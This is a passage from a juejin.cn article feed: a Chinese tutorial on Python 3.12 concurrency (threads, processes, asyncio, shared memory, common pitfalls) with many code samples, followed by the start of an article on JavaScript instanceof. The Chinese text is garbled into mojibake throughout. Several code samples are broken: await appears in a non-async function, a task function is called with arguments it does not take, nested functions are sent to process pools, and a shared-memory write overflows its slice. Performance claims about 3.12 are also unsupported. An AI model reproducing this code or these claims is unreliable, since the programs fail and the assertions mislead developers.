    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tasks)):
        result = result_queue.get()
        results.append(result)
        <span class="hljs-built_in">print</span>(result)

    <span class="hljs-comment"># ç­‰å¾…è¿›ç¨‹ç»“æŸ</span>
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:
        p.join()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<h3 data-id="heading-9">Python 3.12çš„IPCä¼˜åŒ–</h3>
<p>Python 3.12å¯¹è¿›ç¨‹é—´é€šä¿¡åšäº†é‡è¦ä¼˜åŒ–ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing.shared_memory <span class="hljs-keyword">as</span> shared_memory
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-comment"># Python 3.12ä¸­ï¼Œå…±äº«å†…å­˜æ“ä½œæ›´å¿«</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">shared_memory_example</span>():
    <span class="hljs-comment"># åˆ›å»ºå…±äº«å†…å­˜å—</span>
    shm = shared_memory.SharedMemory(create=<span class="hljs-literal">True</span>, size=<span class="hljs-number">1024</span>)

    <span class="hljs-comment"># åœ¨ä¸åŒè¿›ç¨‹ä¸­è®¿é—®åŒä¸€å—å†…å­˜</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">writer</span>():
        shm.buf[:<span class="hljs-number">10</span>] = <span class="hljs-string">b'Hello World'</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reader</span>():
        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(shm.buf[:<span class="hljs-number">10</span>]))

    <span class="hljs-comment"># è¿™ç§æ–¹å¼æ¯”ä¼ ç»Ÿçš„Queueå¿«å¾ˆå¤š</span>
</code></pre>
<h2 data-id="heading-10">å®æˆ˜ï¼šé€‰æ‹©åˆé€‚çš„å¹¶å‘ç­–ç•¥</h2>
<p>å¥½äº†ï¼Œç†è®ºè®²å®Œäº†ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å®é™…é¡¹ç›®ä¸­è¯¥å¦‚ä½•é€‰æ‹©ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, ProcessPoolExecutor

<span class="hljs-keyword">def</span> <span class="hljs-title function_">io_heavy_task</span>():
    <span class="hljs-string">"""I/Oå¯†é›†å‹ï¼šç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ã€æ•°æ®åº“æ“ä½œ"""</span>
    time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"I/Oæ“ä½œå®Œæˆ"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_heavy_task</span>():
    <span class="hljs-string">"""CPUå¯†é›†å‹ï¼šå¤§é‡è®¡ç®—ã€å›¾åƒå¤„ç†ã€æ•°æ®åˆ†æ"""</span>
    count = <span class="hljs-built_in">sum</span>(i * i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100_000</span>))
    <span class="hljs-keyword">return</span> count

<span class="hljs-keyword">def</span> <span class="hljs-title function_">async_io_task</span>():
    <span class="hljs-string">"""å¼‚æ­¥I/Oï¼šé€‚åˆé«˜å¹¶å‘ç½‘ç»œè¯·æ±‚"""</span>
    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">0.1</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"å¼‚æ­¥I/Oå®Œæˆ"</span>

<span class="hljs-comment"># æµ‹è¯•ä¸åŒç­–ç•¥</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_strategies</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== æµ‹è¯•I/Oå¯†é›†å‹ä»»åŠ¡ ==="</span>)

    <span class="hljs-comment"># 1. å¤šçº¿ç¨‹</span>
    start = time.time()
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>) <span class="hljs-keyword">as</span> executor:
        results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(io_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

    <span class="hljs-comment"># 2. å¼‚æ­¥ï¼ˆI/Oä»»åŠ¡çš„æœ€ä½³é€‰æ‹©ï¼‰</span>
    start = time.time()
    tasks = [async_io_task() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)]
    results = <span class="hljs-keyword">await</span> asyncio.gather(*tasks)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼‚æ­¥åç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

    <span class="hljs-comment"># 3. å¤šè¿›ç¨‹ï¼ˆä¸é€‚åˆI/Oä»»åŠ¡ï¼‰</span>
    start = time.time()
    <span class="hljs-keyword">with</span> ProcessPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> executor:
        results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(io_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šè¿›ç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== æµ‹è¯•CPUå¯†é›†å‹ä»»åŠ¡ ==="</span>)

    <span class="hljs-comment"># 1. å¤šçº¿ç¨‹ï¼ˆä¸é€‚åˆCPUä»»åŠ¡ï¼‰</span>
    start = time.time()
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>) <span class="hljs-keyword">as</span> executor:
        results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(cpu_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

    <span class="hljs-comment"># 2. å¤šè¿›ç¨‹ï¼ˆCPUä»»åŠ¡çš„æœ€ä½³é€‰æ‹©ï¼‰</span>
    start = time.time()
    <span class="hljs-keyword">with</span> ProcessPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> executor:
        results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(cpu_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šè¿›ç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    asyncio.run(test_strategies())
</code></pre>
<p><strong>è¿è¡Œç»“æœæ€»ç»“ï¼š</strong></p>

























<table><thead><tr><th>ä»»åŠ¡ç±»å‹</th><th>æœ€ä½³ç­–ç•¥</th><th>æ€§èƒ½æ’å</th></tr></thead><tbody><tr><td>I/Oå¯†é›†å‹</td><td>å¼‚æ­¥åç¨‹</td><td>å¼‚æ­¥ &gt; å¤šçº¿ç¨‹ &gt; å¤šè¿›ç¨‹</td></tr><tr><td>CPUå¯†é›†å‹</td><td>å¤šè¿›ç¨‹</td><td>å¤šè¿›ç¨‹ &gt; å¤šçº¿ç¨‹ &gt; å•çº¿ç¨‹</td></tr><tr><td>æ··åˆå‹</td><td>å¼‚æ­¥ + å¤šè¿›ç¨‹</td><td>æ ¹æ®å…·ä½“åœºæ™¯ç»„åˆ</td></tr></tbody></table>
<h2 data-id="heading-11">Python 3.12å®ç”¨æŠ€å·§æ±‡æ€»</h2>
<p>åŸºäºPython 3.12çš„æ–°ç‰¹æ€§ï¼Œè¿™é‡Œæœ‰ä¸€äº›å®ç”¨çš„å¹¶å‘ç¼–ç¨‹æŠ€å·§ï¼š</p>
<h3 data-id="heading-12">1. æ™ºèƒ½ä»»åŠ¡è°ƒåº¦</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">smart_task_scheduler</span>():
    <span class="hljs-string">"""Python 3.12ä¸­çš„æ™ºèƒ½ä»»åŠ¡è°ƒåº¦"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">task_id, difficulty</span>):
        <span class="hljs-comment"># æ¨¡æ‹Ÿä¸åŒéš¾åº¦çš„ä»»åŠ¡</span>
        time.sleep(difficulty)
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"ä»»åŠ¡<span class="hljs-subst">{task_id}</span>å®Œæˆ"</span>

    <span class="hljs-comment"># ä»»åŠ¡åˆ—è¡¨ï¼ˆID, éš¾åº¦ï¼‰</span>
    tasks = [(<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">0.3</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">0.1</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">0.1</span>)]

    <span class="hljs-comment"># Python 3.12çš„ThreadPoolExecutoræœ‰æ›´å¥½çš„è´Ÿè½½å‡è¡¡</span>
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> executor:
        <span class="hljs-comment"># æŒ‰éš¾åº¦æ’åºï¼ŒçŸ­ä»»åŠ¡ä¼˜å…ˆï¼ˆå‡å°‘é˜»å¡ï¼‰</span>
        tasks.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>])

        futures = [executor.submit(task, tid, diff) <span class="hljs-keyword">for</span> tid, diff <span class="hljs-keyword">in</span> tasks]

        <span class="hljs-comment"># as_completedåœ¨3.12ä¸­æ€§èƒ½æ›´å¥½</span>
        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):
            result = future.result()
            <span class="hljs-built_in">print</span>(result)
</code></pre>
<h3 data-id="heading-13">2. è¿›ç¨‹æ± çš„æ”¹è¿›ç”¨æ³•</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> get_context
<span class="hljs-keyword">import</span> multiprocessing <span class="hljs-keyword">as</span> mp

<span class="hljs-keyword">def</span> <span class="hljs-title function_">improved_process_pool</span>():
    <span class="hljs-string">"""Python 3.12çš„è¿›ç¨‹æ± æœ€ä½³å®è·µ"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">x</span>):
        <span class="hljs-keyword">return</span> x * x

    <span class="hljs-comment"># ä½¿ç”¨get_contextè·å¾—æ›´å¥½çš„è¿›ç¨‹ç®¡ç†</span>
    context = get_context(<span class="hljs-string">"spawn"</span>)  <span class="hljs-comment"># spawnæ¨¡å¼æ›´å®‰å…¨</span>

    <span class="hljs-comment"># Python 3.12ä¸­è¿›ç¨‹æ± çš„é”™è¯¯å¤„ç†æ›´å¥½</span>
    <span class="hljs-keyword">with</span> context.Pool(processes=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> pool:
        <span class="hljs-keyword">try</span>:
            results = pool.<span class="hljs-built_in">map</span>(worker, <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))
            <span class="hljs-built_in">print</span>(results)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¿›ç¨‹æ± å‡ºé”™: <span class="hljs-subst">{e}</span>"</span>)
            pool.terminate()  <span class="hljs-comment"># 3.12ä¸­æ›´å¯é çš„æ¸…ç†</span>
</code></pre>
<h3 data-id="heading-14">3. å¼‚æ­¥ä¸å¤šè¿›ç¨‹çš„æ··åˆä½¿ç”¨</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ProcessPoolExecutor

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">hybrid_approach</span>():
    <span class="hljs-string">"""å¼‚æ­¥ + å¤šè¿›ç¨‹ï¼šPython 3.12çš„é«˜æ€§èƒ½ç»„åˆ"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_bound_task</span>(<span class="hljs-params">x</span>):
        <span class="hljs-comment"># CPUå¯†é›†å‹è®¡ç®—</span>
        result = <span class="hljs-built_in">sum</span>(i * i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(x))
        <span class="hljs-keyword">return</span> result

    <span class="hljs-comment"># åœ¨å¼‚æ­¥å¾ªç¯ä¸­ä½¿ç”¨è¿›ç¨‹æ± </span>
    loop = asyncio.get_event_loop()

    <span class="hljs-keyword">with</span> ProcessPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> executor:
        tasks = []
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):
            <span class="hljs-comment"># å°†CPUä»»åŠ¡æäº¤åˆ°è¿›ç¨‹æ± </span>
            task = loop.run_in_executor(executor, cpu_bound_task, i * <span class="hljs-number">10000</span>)
            tasks.append(task)

        <span class="hljs-comment"># å¼‚æ­¥ç­‰å¾…æ‰€æœ‰CPUä»»åŠ¡å®Œæˆ</span>
        results = <span class="hljs-keyword">await</span> asyncio.gather(*tasks)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ··åˆæ¨¡å¼ç»“æœ: <span class="hljs-subst">{results}</span>"</span>)
</code></pre>
<h2 data-id="heading-15">è¸©å‘æŒ‡å—ï¼šè¡€æ³ªæ•™è®­</h2>
<p>å³ä½¿æœ‰äº†Python 3.12çš„ä¼˜åŒ–ï¼Œæœ‰äº›å‘è¿˜æ˜¯å¾—æ³¨æ„ï¼š</p>
<h3 data-id="heading-16">1. è¿›ç¨‹æ•°ä¸æ˜¯è¶Šå¤šè¶Šå¥½</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_process_count</span>():
    <span class="hljs-string">"""æµ‹è¯•æœ€ä¼˜è¿›ç¨‹æ•°"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>():
        time.sleep(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>

    <span class="hljs-comment"># CPUæ ¸å¿ƒæ•°</span>
    cpu_count = multiprocessing.cpu_count()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"CPUæ ¸å¿ƒæ•°: <span class="hljs-subst">{cpu_count}</span>"</span>)

    <span class="hljs-keyword">for</span> worker_count <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, cpu_count, cpu_count * <span class="hljs-number">2</span>, cpu_count * <span class="hljs-number">4</span>]:
        start = time.time()
        <span class="hljs-keyword">with</span> multiprocessing.Pool(processes=worker_count) <span class="hljs-keyword">as</span> pool:
            results = pool.<span class="hljs-built_in">map</span>(task, <span class="hljs-built_in">range</span>(cpu_count * <span class="hljs-number">2</span>))
        end = time.time()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{worker_count}</span>ä¸ªè¿›ç¨‹è€—æ—¶: <span class="hljs-subst">{end - start:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)

<span class="hljs-comment"># é€šå¸¸è¿›ç¨‹æ•° = CPUæ ¸å¿ƒæ•° æˆ– CPUæ ¸å¿ƒæ•° + 1</span>
</code></pre>
<h3 data-id="heading-17">2. å…¨å±€å˜é‡çš„é™·é˜±</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ é”™è¯¯ç¤ºä¾‹</span>
global_data = []

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>():
    global_data.append(<span class="hljs-number">1</span>)  <span class="hljs-comment"># åœ¨å¤šè¿›ç¨‹ä¸­å¯èƒ½ä¸ä¼šç”Ÿæ•ˆï¼</span>

<span class="hljs-comment"># âœ… æ­£ç¡®æ–¹å¼</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">queue</span>):
    queue.put(<span class="hljs-number">1</span>)  <span class="hljs-comment"># ä½¿ç”¨é˜Ÿåˆ—ä¼ é€’æ•°æ®</span>
</code></pre>
<h3 data-id="heading-18">3. æ­»é”çš„é£é™©</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># âŒ å±é™©ä»£ç ï¼šå¯èƒ½åœ¨Python 3.12ä¸­ä¹Ÿä¼šæ­»é”</span>
lock = multiprocessing.Lock()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>():
    <span class="hljs-keyword">with</span> lock:
        time.sleep(<span class="hljs-number">1</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"å·¥ä½œå®Œæˆ"</span>)

<span class="hljs-comment"># âœ… ä½¿ç”¨è¶…æ—¶æœºåˆ¶</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_worker</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> lock.acquire(timeout=<span class="hljs-number">5</span>):  <span class="hljs-comment"># Python 3.12ä¸­æ›´å¯é çš„è¶…æ—¶</span>
            <span class="hljs-keyword">try</span>:
                time.sleep(<span class="hljs-number">1</span>)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"å®‰å…¨å·¥ä½œå®Œæˆ"</span>)
            <span class="hljs-keyword">finally</span>:
                lock.release()
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"è·å–é”è¶…æ—¶"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‡ºé”™: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<h2 data-id="heading-19">æ€»ç»“ï¼šå¦‚ä½•é€‰æ‹©æ­£ç¡®çš„å¹¶å‘ç­–ç•¥</h2>
<p>çœ‹äº†è¿™ä¹ˆå¤šï¼Œåˆ°åº•è¯¥æ€ä¹ˆé€‰ï¼Ÿè¿™é‡Œç»™ä½ ä¸€å¼ å†³ç­–è¡¨ï¼š</p>
<pre><code class="hljs language-css" lang="css">åœºæ™¯é€‰æ‹©æµç¨‹ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ä½ çš„ä»»åŠ¡æ˜¯ä»€ä¹ˆï¼Ÿ   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†“
    â”Œâ”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”
    â”‚<span class="hljs-selector-tag">I</span>/Oå¯†é›†â”‚       â”‚CPUå¯†é›†â”‚       â”‚æ··åˆå‹ â”‚
    â””â”€â”€â”€â”¬â”€â”€â”˜       â””â”€â”€â”€â”¬â”€â”€â”˜       â””â”€â”€â”€â”¬â”€â”€â”˜
        â†“               â†“               â†“
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ç½‘ç»œè¯·æ±‚å¤šï¼Ÿâ”‚     â”‚è®¡ç®—é‡å¤§ï¼Ÿ â”‚     â”‚ç½‘ç»œ+è®¡ç®—éƒ½æœ‰ï¼Ÿ â”‚
  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â†“                â†“                â†“
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚å¼‚æ­¥åç¨‹ â”‚     â”‚å¤šè¿›ç¨‹   â”‚     â”‚å¼‚æ­¥+å¤šè¿›ç¨‹   â”‚
  â”‚(asyncio)â”‚     â”‚         â”‚     â”‚   æ··åˆä½¿ç”¨   â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å®ç”¨å»ºè®®ï¼š</strong></p>
<ol>
<li><strong>ä¼˜å…ˆè€ƒè™‘å¼‚æ­¥</strong>ï¼šPython 3.12çš„asyncioå·²ç»å¾ˆæˆç†Ÿï¼Œå¤§éƒ¨åˆ†I/Oåœºæ™¯éƒ½é€‚ç”¨</li>
<li><strong>CPUä»»åŠ¡ç”¨å¤šè¿›ç¨‹</strong>ï¼šåˆ«çŠ¹è±«ï¼Œè¿™æ˜¯æœ€ç›´æ¥çš„è§£å†³æ–¹æ¡ˆ</li>
<li><strong>åˆç†è®¾ç½®è¿›ç¨‹æ•°</strong>ï¼šé€šå¸¸æ˜¯CPUæ ¸å¿ƒæ•°æˆ–æ ¸å¿ƒæ•°+1</li>
<li><strong>æ³¨æ„è¿›ç¨‹é—´é€šä¿¡å¼€é”€</strong>ï¼šæ•°æ®é‡å¤§ä¼šå½±å“æ€§èƒ½</li>
<li><strong>åŠæ—¶å‡çº§åˆ°Python 3.12</strong>ï¼šæ€§èƒ½æå‡æ˜æ˜¾ï¼Œç‰¹åˆ«æ˜¯å¯¹ç°æœ‰ä»£ç </li>
</ol>
<h2 data-id="heading-20">å†™åœ¨æœ€å</h2>
<p>å›åˆ°å¼€å¤´çš„é—®é¢˜ï¼šä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§Python 3.12ï¼Ÿ</p>
<p>ç­”æ¡ˆä¸ä»…ä»…æ˜¯"å®ƒæ›´å¿«"ï¼Œè€Œæ˜¯ï¼š</p>
<ol>
<li><strong>å¹¶å‘æ€§èƒ½æ˜¾è‘—æå‡</strong>ï¼šGILä¼˜åŒ–ã€TLSæ”¹è¿›ã€è°ƒåº¦ç®—æ³•å‡çº§</li>
<li><strong>æ›´å¥½çš„é”™è¯¯å¤„ç†</strong>ï¼šè¿›ç¨‹æ± å’Œçº¿ç¨‹æ± æ›´ç¨³å®šå¯é </li>
<li><strong>å‘åå…¼å®¹</strong>ï¼šå‡çº§æˆæœ¬ä½ï¼Œæ”¶ç›Šé«˜</li>
<li><strong>æœªæ¥è¶‹åŠ¿</strong>ï¼šPythonç”Ÿæ€åœˆæ­£åœ¨å‘3.12+è¿ç§»</li>
</ol>
<p><strong>è®°ä½ä¸€å¥è¯ï¼šPythonå¹¶å‘ç¼–ç¨‹ä¸æ˜¯é€‰æ‹©å¤šçº¿ç¨‹è¿˜æ˜¯å¤šè¿›ç¨‹ï¼Œè€Œæ˜¯ç†è§£ä½ çš„ä»»åŠ¡æœ¬è´¨ï¼Œé€‰æ‹©æœ€åˆé€‚çš„å·¥å…·ã€‚</strong></p>
<p>ä¸‹æ¬¡å†é‡åˆ°æ€§èƒ½ç“¶é¢ˆï¼Œä¸è¦åªæƒ³ç€"åŠ çº¿ç¨‹"æˆ–"åŠ è¿›ç¨‹"ï¼Œå…ˆé—®é—®è‡ªå·±ï¼š</p>
<ul>
<li>æˆ‘çš„ä»»åŠ¡ç“¶é¢ˆåœ¨å“ªé‡Œï¼Ÿæ˜¯I/Oè¿˜æ˜¯CPUï¼Ÿ</li>
<li>æˆ‘çš„æ•°æ®é‡æœ‰å¤šå¤§ï¼Ÿè¿›ç¨‹é—´é€šä¿¡å¼€é”€å¦‚ä½•ï¼Ÿ</li>
<li>æˆ‘çš„é¡¹ç›®é€‚åˆå‡çº§åˆ°Python 3.12å—ï¼Ÿ</li>
</ul>
<p>æƒ³æ¸…æ¥šè¿™äº›ï¼Œä½ å°±èƒ½å†™å‡ºçœŸæ­£é«˜æ•ˆçš„å¹¶å‘ä»£ç ã€‚</p>
<hr/>
<p><strong>äº’åŠ¨æ—¶é—´</strong>ï¼šä½ åœ¨é¡¹ç›®é‡Œè¸©è¿‡å“ªäº›å¹¶å‘ç¼–ç¨‹çš„å‘ï¼Ÿè¯„è®ºåŒºèŠèŠï¼Œçœ‹çœ‹è°è¸©çš„å‘æœ€æ·±ï¼ ( ` Ï‰Â´ )</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰‹å†™ instanceofï¼šæ·±å…¥ç†è§£ JavaScript åŸå‹ä¸ç»§æ‰¿æœºåˆ¶]]></title>    <link>https://juejin.cn/post/7581036773607571456</link>    <guid>https://juejin.cn/post/7581036773607571456</guid>    <pubDate>2025-12-08T05:46:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581036773607571456" data-draft-id="7581036773607555072" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰‹å†™ instanceofï¼šæ·±å…¥ç†è§£ JavaScript åŸå‹ä¸ç»§æ‰¿æœºåˆ¶"/> <meta itemprop="keywords" content="JavaScript,HTML,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T05:46:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wwwwW"/> <meta itemprop="url" content="https://juejin.cn/user/631558156323657"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰‹å†™ instanceofï¼šæ·±å…¥ç†è§£ JavaScript åŸå‹ä¸ç»§æ‰¿æœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/631558156323657/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wwwwW
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:46:20.000Z" title="Mon Dec 08 2025 05:46:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
